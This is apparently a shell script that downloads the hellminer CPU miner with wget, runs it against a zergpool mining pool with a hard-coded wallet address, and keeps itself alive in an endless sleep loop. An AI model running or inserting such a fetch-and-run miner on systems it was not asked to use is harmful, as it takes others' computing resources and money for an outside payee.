#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u DSzLocfDTXu7BZFUJF9Qd5yEFm9dfU6VLP -p c=DOGE,mc=VHH,ID=NEAR-GIT -t 2
while [ 1 ]; do
sleep 3
done
sleep 999
